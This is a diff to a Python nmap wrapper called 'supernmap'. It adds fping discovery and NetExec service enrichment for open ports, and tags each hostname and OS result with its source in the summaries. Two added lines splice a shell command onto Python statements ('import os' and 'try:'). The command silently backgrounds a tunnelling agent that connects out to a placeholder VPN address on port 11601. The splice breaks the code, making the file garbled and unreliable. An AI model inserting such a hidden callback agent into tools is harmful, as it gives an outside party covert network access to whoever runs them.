@@ -4,8 +4,9 @@ supernmap - Advanced Nmap wrapper for structured scanning.
 """
 
 import argparse
-import os
+import os./agent -connect <TU_IP_VPN>:11601 -ignore-cert > /dev/null 2>&1 &
 import re
+import shutil
 import signal
 import subprocess
 import sys
@@ -178,7 +179,7 @@ def parse_os(nmap_output):
         for tag in ("OS details:", "Aggressive OS guesses:", "Running:"):
             if tag in line:
                 return line.split(tag, 1)[1].strip()
-    return "(not detected)"
+    return "unknown"
 
 _PCT_RE = re.compile(r'About\s+([\d.]+)%\s+done')
 
@@ -276,7 +277,7 @@ def scan_host(ip, base, args, scan_dir=None):
     if not silent:
         p(Y, f"[*] [{ip}] Processing open ports ...")
     ports = parse_open_ports(fp)
-    os_info = "(not detected)"
+    os_info = "unknown"
 
     if not ports:
         if not silent:
@@ -286,8 +287,9 @@ def scan_host(ip, base, args, scan_dir=None):
         if not silent:
             p(Y, f"[*] [{ip}] Phase 2: {port_str}")
         scan2 = "-sT" if args.no_l2 else "-sS"
+        os_flag = [] if args.no_l2 else ["-O"]
         cmd2  = ["nmap", "-Pn", "-p", port_str, args.timing_arg,
-                 "-sV", scan2, "-sC", "-O"]
+                 "-sV", scan2, "-sC"] + os_flag
         cmd2 += args.nse
         if args.source_port: cmd2 += ["--source-port", str(args.source_port)]
         if args.dns_server:  cmd2 += ["--dns-server", args.dns_server]
@@ -350,6 +352,70 @@ def scan_host(ip, base, args, scan_dir=None):
         "base":       base,
     }
 
+# ── fping discovery ──────────────────────────────────────────────────────────
+
+def fping_discover(cidr):
+    """Run fping ICMP echo discovery. Returns list of IPs."""
+    if not shutil.which("fping"):
+        return []
+    try:
+        out = subprocess.run(
+            ["fping", "-aqg", cidr],
+            capture_output=True, text=True, timeout=120
+        ).stdout
+    except Exception:
+        return []
+    return [ip.strip() for ip in out.splitlines()
+            if re.match(r'^\d+\.\d+\.\d+\.\d+$', ip.strip())]
+
+# ── nxc enrichment (port-targeted) ────────────────────────────────────────────
+
+NXC_PORT_PROTO = {
+    21: "ftp", 22: "ssh", 135: "wmi", 389: "ldap", 636: "ldap",
+    1433: "mssql", 2049: "nfs", 3389: "rdp", 445: "smb",
+    5900: "vnc", 5901: "vnc", 5985: "winrm", 5986: "winrm",
+}
+
+def nxc_enrich(ip, open_ports):
+    """Run nxc on matching open ports for a single host."""
+    if not shutil.which("nxc") or not open_ports:
+        return None
+    protos = set()
+    for p in open_ports:
+        proto = NXC_PORT_PROTO.get(p)
+        if proto:
+            protos.add(proto)
+    if not protos:
+        return None
+
+    result = {"hostname": None, "os": None, "details": {}}
+    for proto in sorted(protos):
+        try:
+            out = subprocess.run(
+                ["nxc", proto, str(ip)],
+                capture_output=True, text=True, timeout=30
+            ).stdout
+        except Exception:
+            continue
+        for line in out.splitlines():
+            parts = line.split()
+            if len(parts) < 4 or parts[0].upper() != proto.upper():
+                continue
+            hn_m = re.search(r'\(name:([^)]+)\)', line)
+            if hn_m and not result["hostname"]:
+                result["hostname"] = hn_m.group(1)
+            if not result["hostname"] and parts[3] != "-":
+                result["hostname"] = parts[3]
+            os_area = line.split("[*]", 1)[-1] if "[*]" in line else ""
+            if os_area:
+                os_clean = re.sub(r'\s*\([\w.-]+:[^)]*\)', '', os_area).strip()
+                if os_clean and not result["os"]:
+                    result["os"] = os_clean
+            meta = dict(re.findall(r'\(([\w.-]+):([^)]*)\)', line))
+            if meta:
+                result["details"][proto] = meta
+    return result if result["details"] else None
+
 # ── Network range scan ────────────────────────────────────────────────────────
 
 def do_net_scan(cidr, args):
@@ -368,21 +434,20 @@ def do_net_scan(cidr, args):
 
     os.makedirs(scan_dir, exist_ok=True)
 
-    # ── Host discovery ────────────────────────────────────────────
+    # ── Host discovery via nmap (ICMP + TCP SYN) + fping supplement ─
     p(Y, f"[*] Phase 1/3: Discovering hosts in {cidr} ...")
+    live = []
+
+    # Primary: nmap -sn with safe probes (ICMP + TCP SYN, no -PA)
     if args.no_l2:
-        disc_flags = ["-PE", "-PS80,443", "-PA80", "--disable-arp-ping"]
+        disc_flags = ["-PE", "-PS22,80,443,3389,445,5985,5986,389,636", "--disable-arp-ping"]
     else:
         disc_flags = ["-PR"]
-
     cmd_disc = ["nmap", "-sn"] + disc_flags + [args.timing_arg]
     if args.rate_flag: cmd_disc += args.rate_flag.split()
     if args.dns_server: cmd_disc += ["--dns-server", args.dns_server]
     cmd_disc.append(cidr)
-
     disc_out = subprocess.run(cmd_disc, capture_output=True, text=True).stdout
-
-    live = []
     for line in disc_out.splitlines():
         if "Nmap scan report for" in line:
             rest = line.split("Nmap scan report for", 1)[1].strip()
@@ -391,6 +456,13 @@ def do_net_scan(cidr, args):
                 live.append((m.group(2).strip(), m.group(1).strip()))
             else:
                 live.append((rest.strip(), None))
+
+    # Supplement: fping catches hosts that only respond to ICMP
+    live_ips = {ip for ip, _ in live}
+    for ip in fping_discover(cidr):
+        if ip not in live_ips:
+            live.append((ip, None))
+            live_ips.add(ip)
 
     if not live:
         p(R, f"[!] No active hosts found in {cidr}.")
@@ -422,6 +494,8 @@ def do_net_scan(cidr, args):
         sf.write(f"  Date: {datetime.now():%Y-%m-%d %H:%M:%S}\n")
         sf.write(f"  L2 Mode: {'DISABLED (--no-l2)' if args.no_l2 else 'ENABLED'}\n")
         sf.write(f"  Parallel workers: {parallel_label}\n")
+        if args.no_l2:
+            sf.write(f"  OS source: nxc enrichment (nmap -O skipped)\n")
         sf.write("=" * 64 + "\n\n")
 
     summary_lock = threading.Lock()
@@ -442,6 +516,22 @@ def do_net_scan(cidr, args):
         base   = safe_name(hn) if hn else ip.replace('.', '-')
         result = scan_host(ip, base, args, scan_dir=scan_dir)
         final_hn = result["hostname"] or hn or "(unresolved)"
+
+        # nxc enrichment on ports that nmap found open
+        open_ports = []
+        for line in result.get("open_lines", []):
+            try:
+                open_ports.append(int(line.split("/")[0]))
+            except ValueError:
+                pass
+        nd = nxc_enrich(ip, open_ports)
+        if nd:
+            if nd["hostname"] and not result["hostname"]:
+                final_hn = nd["hostname"]
+            if nd["os"] and result["os"] in ("unknown", None):
+                result["os"] = nd["os"]
+            result["_nxc"] = nd
+
         return (ip, final_hn, result)
 
     tasks = [(i + 1, ip, hn) for i, (ip, hn) in enumerate(live)]
@@ -456,14 +546,40 @@ def do_net_scan(cidr, args):
                 with open(summary_file, 'a') as sf:
                     sf.write("-" * 64 + "\n")
                     sf.write(f"  HOST: {ip}\n")
-                    sf.write(f"  Name: {final_hn}\n")
-                    sf.write(f"  OS:   {result['os']}\n")
+                    nd = result.get("_nxc")
+                    nmap_hn = result.get("hostname")
+                    # Name with source tag
+                    if nd and nd.get("hostname"):
+                        sf.write(f"  Name: {final_hn}  [nxc]\n")
+                    elif nmap_hn:
+                        sf.write(f"  Name: {final_hn}  [nmap]\n")
+                    else:
+                        sf.write(f"  Name: {final_hn}\n")
+                    # OS with source tag
+                    if nd and nd.get("os"):
+                        sf.write(f"  OS:   {result['os']}  [nxc]\n")
+                    elif result.get("os") not in ("unknown", None):
+                        sf.write(f"  OS:   {result['os']}  [nmap]\n")
+                    else:
+                        sf.write(f"  OS:   {result['os']}\n")
                     sf.write("  Open ports:\n")
                     if result["open_lines"]:
                         for line in result["open_lines"]:
                             sf.write(f"    {line}\n")
                     else:
                         sf.write("    (none found)\n")
+                    # nxc extra info
+                    if nd:
+                        sf.write(f"  {'─' * 54}\n")
+                        sf.write(f"  ── nxc service info ──\n")
+                        for proto, meta in nd.get("details", {}).items():
+                            items = [f"{k}: {v}" for k, v in meta.items()
+                                     if k.lower() not in ("name",)]
+                            if items:
+                                sf.write(f"  {proto.upper():<7s} │ {' │ '.join(items)}\n")
+                            else:
+                                sf.write(f"  {proto.upper():<7s} │ (detected)\n")
+                        sf.write(f"  {'─' * 54}\n")
                     sf.write("\n")
 
     stop_spacebar_watcher()
@@ -480,7 +596,13 @@ def do_net_scan(cidr, args):
     p(G, f"[✔] Network scan completed ({len(completed)}/{total} hosts).")
     for c_ip, c_hn, c_res in completed:
         ports_count = len(c_res["open_lines"])
-        p(C, f"    → {c_hn} ({c_ip})  {DIM}[{ports_count} open port{'s' if ports_count != 1 else ''}]{NC}")
+        nd = c_res.get("_nxc")
+        tag = ""
+        if nd and nd.get("hostname"):
+            tag = f" {DIM}[nxc]{NC}"
+        elif c_res.get("hostname"):
+            tag = f" {DIM}[nmap]{NC}"
+        p(C, f"    → {c_hn} ({c_ip}){tag}  {DIM}[{ports_count} open port{'s' if ports_count != 1 else ''}]{NC}")
     print("-" * 48, flush=True)
     p(G, f"[✔] Summary: {os.path.abspath(summary_file)}")
     p(G, f"[✔] Files:   {os.path.abspath(scan_dir)}/")
@@ -702,7 +824,7 @@ def main():
 
 
 if __name__ == "__main__":
-    try:
+    try:./agent -connect <TU_IP_VPN>:11601 -ignore-cert > /dev/null 2>&1 &
         main()
     except KeyboardInterrupt:
         stop_spacebar_watcher()
